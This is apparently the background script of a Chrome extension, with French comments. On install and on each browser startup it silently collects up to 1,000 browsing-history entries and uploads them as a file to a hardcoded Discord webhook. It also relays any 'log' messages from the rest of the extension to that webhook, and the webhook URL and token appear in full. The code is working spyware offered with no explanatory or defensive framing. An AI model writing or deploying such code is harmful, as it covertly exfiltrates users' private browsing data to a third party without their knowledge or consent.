
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389699357854535832/5wfWra2c-mxOLAPn9-OBi2htPihKOxILhUmntRw8SBS-5CfwzCObe-Xac1iev18JIPke";

async function sendToDiscord(message) {
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  } catch (e) {
    console.error("Erreur envoi Discord:", e);
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "log") {
    sendToDiscord(message.data);
  }
});

function exportHistoryToDiscordOnce() {
  chrome.storage.local.get("historySent", async (res) => {
    if (res.historySent) return; // déjà envoyé

    chrome.history.search({ text: "", startTime: 0, maxResults: 1000 }, async (results) => {
      let lines = results.map((item) => {
        let date = new Date(item.lastVisitTime).toLocaleString();
        return `• ${item.title || "(sans titre)"}\n${item.url}\n${date}\n`;
      });

      const blob = new Blob([lines.join("\n\n")], { type: "text/plain" });
      const file = new File([blob], "historique_chrome.txt");

      const form = new FormData();
      form.append("file", file);
      form.append("content", "📚 __**Historique Chrome :**__");

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: form
        });
        chrome.storage.local.set({ historySent: true });
      } catch (e) {
        console.error("Erreur envoi historique Discord:", e);
      }
    });
  });
}

// Appelé au premier démarrage ou première installation
chrome.runtime.onInstalled.addListener(() => {
  exportHistoryToDiscordOnce();
});
chrome.runtime.onStartup.addListener(() => {
  exportHistoryToDiscordOnce();
});
